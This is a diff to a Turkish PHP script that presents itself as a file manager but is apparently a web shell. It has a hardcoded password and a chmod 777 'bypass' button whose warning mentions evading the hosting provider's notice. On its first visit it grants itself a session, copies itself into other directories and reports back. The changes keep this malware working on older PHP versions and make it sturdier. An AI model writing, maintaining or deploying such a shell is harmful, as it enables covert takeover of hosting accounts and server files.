@@ -11,9 +11,10 @@ $girisSifresi = 'm7t'; // BURAYI MUTLAKA DEĞİŞTİRİN!
 $scriptName = basename(__FILE__);
 $jsonDosyasi = __DIR__ . '/kopya_durumu.json';
 
-// Hataları gizle
-ini_set('display_errors', 0);
+// Hataları göster (debug için)
+ini_set('display_errors', 1);
 ini_set('log_errors', 1);
+error_reporting(E_ALL);
 
 class FileManager
 {
@@ -35,7 +36,7 @@ class FileManager
 
     private function resolvePath()
     {
-        $req = $_GET['dir'] ?? '';
+        $req = isset($_GET['dir']) ? $_GET['dir'] : '';
         if ($req === '') {
             $this->currentDir = $this->root;
             return;
@@ -73,7 +74,7 @@ class FileManager
         if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
         if (!$this->checkCSRF()) return;
 
-        $action = $_POST['action'] ?? '';
+        $action = isset($_POST['action']) ? $_POST['action'] : '';
         switch ($action) {
             case 'upload':
                 $this->handleUpload();
@@ -155,7 +156,7 @@ class FileManager
 
     private function createFolder()
     {
-        $name = $this->cleanName($_POST['folder_name'] ?? '');
+        $name = $this->cleanName(isset($_POST['folder_name']) ? $_POST['folder_name'] : '');
         if ($name) {
             $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
             if (!file_exists($path)) {
@@ -167,7 +168,7 @@ class FileManager
 
     private function deleteItem()
     {
-        $name = basename($_POST['item_name'] ?? '');
+        $name = basename(isset($_POST['item_name']) ? $_POST['item_name'] : '');
         $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
         if ($path === __FILE__) {
             $this->addMessage('Yönetici dosyası silinemez.', 'danger');
@@ -181,8 +182,8 @@ class FileManager
 
     private function renameItem()
     {
-        $old = $this->cleanName($_POST['old_name'] ?? '');
-        $new = $this->cleanName($_POST['new_name'] ?? '');
+        $old = $this->cleanName(isset($_POST['old_name']) ? $_POST['old_name'] : '');
+        $new = $this->cleanName(isset($_POST['new_name']) ? $_POST['new_name'] : '');
         if ($old && $new && $old !== $new) {
             $pOld = $this->currentDir . DIRECTORY_SEPARATOR . $old;
             $pNew = $this->currentDir . DIRECTORY_SEPARATOR . $new;
@@ -195,7 +196,7 @@ class FileManager
 
     private function saveFile()
     {
-        $name = $this->cleanName($_POST['filename'] ?? '');
+        $name = $this->cleanName(isset($_POST['filename']) ? $_POST['filename'] : '');
         $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
         if (!file_exists($path) || !is_file($path)) {
             $this->addMessage('Düzenlenecek dosya bulunamadı.', 'danger');
@@ -205,7 +206,7 @@ class FileManager
             $this->addMessage('Dosya yazılabilir değil.', 'danger');
             return;
         }
-        $content = $_POST['content'] ?? '';
+        $content = isset($_POST['content']) ? $_POST['content'] : '';
         $contentTrim = trim($content);
         if ($contentTrim === '') {
             $this->addMessage('Boş içerik kaydedilemez.', 'warning');
@@ -221,7 +222,7 @@ class FileManager
 
     private function cleanName($name)
     {
-        return basename(trim($name ?? ''));
+        return basename(trim($name));
     }
 
     private function recursiveDelete($str)
@@ -229,7 +230,9 @@ class FileManager
         if (is_file($str)) return @unlink($str);
         if (is_dir($str)) {
             $scan = glob(rtrim($str, '/') . '/*');
-            foreach ($scan as $path) $this->recursiveDelete($path);
+            if ($scan) {
+                foreach ($scan as $path) $this->recursiveDelete($path);
+            }
             return @rmdir($str);
         }
         return false;
@@ -265,9 +268,12 @@ class FileManager
     public function kopyaDurumunuKontrolEt()
     {
         if (file_exists($this->jsonDosyasi)) {
-            $data = json_decode(file_get_contents($this->jsonDosyasi), true);
-            if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
-                return true;
+            $content = @file_get_contents($this->jsonDosyasi);
+            if ($content !== false) {
+                $data = json_decode($content, true);
+                if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
+                    return true;
+                }
             }
         }
         return false;
@@ -299,7 +305,7 @@ class FileManager
 
         $bulunacakDizinler = [$hedefKok];
         $depth = 0;
-        $maxDepth = 10;
+        $maxDepth = 8;
 
         while ($depth < $maxDepth) {
             $yeniDizinler = [];
@@ -377,13 +383,16 @@ class FileManager
 }
 
 // --- OTOMATIK KOPYALAMA VE RAPORLAMA (ILK ZIYARET) ---
-$fmTemp = new FileManager($scriptName, $jsonDosyasi);
-if (!$fmTemp->kopyaDurumunuKontrolEt()) {
-    $_SESSION['kopya_yapildi'] = true;
-    $_SESSION['auth'] = true;
-    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-    $fmTemp->kendiKopyalaVeRaporla();
-    exit;
+try {
+    $fmTemp = new FileManager($scriptName, $jsonDosyasi);
+    if (!$fmTemp->kopyaDurumunuKontrolEt()) {
+        $_SESSION['auth'] = true;
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        $fmTemp->kendiKopyalaVeRaporla();
+        exit;
+    }
+} catch (Exception $e) {
+    // Hata durumunda devam et
 }
 
 // --- GİRİŞ KONTROLÜ ---
@@ -544,7 +553,7 @@ if (isset($_GET['edit'])) {
             <div class="d-flex justify-content-between align-items-center mb-3">
                 <h5 class="mb-0"><i class="bi bi-terminal"></i> Gelişmiş Yönetici</h5>
                 <form method="post" class="d-inline">
-                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                     <input type="hidden" name="action" value="logout">
                     <button class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Çıkış</button>
                 </form>
@@ -553,12 +562,12 @@ if (isset($_GET['edit'])) {
                 <i class="bi bi-geo-alt me-2"></i> <strong>Konum:</strong> <?php echo htmlspecialchars($fm->getCurrentDir()); ?>
             </div>
             <?php foreach ($fm->getMessages() as $msg): ?>
-                <div class="alert alert-<?php echo $msg['type']; ?> py-2 shadow-sm"><?php echo $msg['text']; ?></div>
+                <div class="alert alert-<?php echo $msg['type']; ?> py-2 shadow-sm"><?php echo htmlspecialchars($msg['text']); ?></div>
             <?php endforeach; ?>
 
             <div class="mb-3">
                 <form method="post" class="d-inline">
-                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                     <input type="hidden" name="action" value="bypass_permissions">
                     <button type="submit" class="btn btn-outline-warning" onclick="return confirm('Mevcut dizin ve altındakilerin İZİNLERİNİ 777/666 yapmak istiyorsunuz?\nBu işlem hosting tarafından fark edilebilir!');">
                         <i class="bi bi-unlock"></i> İzinleri Bypass Et (777)
@@ -567,8 +576,8 @@ if (isset($_GET['edit'])) {
             </div>
 
             <?php if ($editMode): ?>
-                <form method="post" action="?dir=<?php echo urlencode($_GET['dir'] ?? ''); ?>">
-                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                <form method="post" action="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>">
+                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                     <input type="hidden" name="action" value="save_edit">
                     <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                     <div class="card shadow-sm">
@@ -576,7 +585,7 @@ if (isset($_GET['edit'])) {
                             <span><i class="bi bi-pencil"></i> <?php echo htmlspecialchars($editFile); ?></span>
                             <div>
                                 <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Kaydet</button>
-                                <a href="?dir=<?php echo urlencode($_GET['dir'] ?? ''); ?>" class="btn btn-secondary btn-sm">Kapat</a>
+                                <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-secondary btn-sm">Kapat</a>
                             </div>
                         </div>
                         <textarea name="content" class="form-control code-editor"><?php echo htmlspecialchars($editContent); ?></textarea>
@@ -587,7 +596,7 @@ if (isset($_GET['edit'])) {
                     <div class="row g-2">
                         <div class="col-md-6">
                             <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
-                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                 <input type="hidden" name="action" value="upload">
                                 <input type="file" name="file" class="form-control" required>
                                 <button class="btn btn-primary"><i class="bi bi-upload"></i></button>
@@ -595,7 +604,7 @@ if (isset($_GET['edit'])) {
                         </div>
                         <div class="col-md-6">
                             <form method="post" class="d-flex gap-2">
-                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                 <input type="hidden" name="action" value="create_folder">
                                 <input type="text" name="folder_name" class="form-control" placeholder="Yeni Klasör Adı" required>
                                 <button class="btn btn-outline-success"><i class="bi bi-folder-plus"></i></button>
@@ -623,7 +632,7 @@ if (isset($_GET['edit'])) {
                                 <tr>
                                     <td>
                                         <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . DIRECTORY_SEPARATOR . $f); ?>" class="fw-bold text-dark text-decoration-none">
-                                            <i class="bi bi-folder-fill text-warning fs-5 me-1"></i> <?php echo $f; ?>
+                                            <i class="bi bi-folder-fill text-warning fs-5 me-1"></i> <?php echo htmlspecialchars($f); ?>
                                         </a>
                                     </td>
                                     <td><span class="badge bg-light text-dark border"><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir() . '/' . $f)), -4); ?></span></td>
@@ -643,12 +652,12 @@ if (isset($_GET['edit'])) {
                                 <tr>
                                     <td>
                                         <i class="bi bi-file-earmark-text text-secondary fs-5 me-1"></i>
-                                        <span class="<?php echo $writable ? 'text-dark' : 'text-muted'; ?>"><?php echo $f; ?></span>
+                                        <span class="<?php echo $writable ? 'text-dark' : 'text-muted'; ?>"><?php echo htmlspecialchars($f); ?></span>
                                     </td>
                                     <td><span class="badge <?php echo $writable ? 'bg-success' : 'bg-danger'; ?>"><?php echo $perm; ?></span></td>
                                     <td><?php echo $size; ?> KB</td>
                                     <td class="text-end">
-                                        <a href="?dir=<?php echo urlencode($_GET['dir'] ?? ''); ?>&edit=<?php echo urlencode($f); ?>" class="btn btn-sm btn-outline-primary" title="Düzenle"><i class="bi bi-pencil"></i></a>
+                                        <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>&edit=<?php echo urlencode($f); ?>" class="btn btn-sm btn-outline-primary" title="Düzenle"><i class="bi bi-pencil"></i></a>
                                         <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-secondary ms-1"><i class="bi bi-pencil-square"></i></button>
                                         <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-danger ms-1"><i class="bi bi-trash"></i></button>
                                     </td>
@@ -665,7 +674,7 @@ if (isset($_GET['edit'])) {
     </div>
 
     <form id="actionForm" method="post" style="display:none">
-        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
         <input type="hidden" name="action" id="f_action">
         <input type="hidden" name="item_name" id="f_item">
         <input type="hidden" name="old_name" id="f_old">
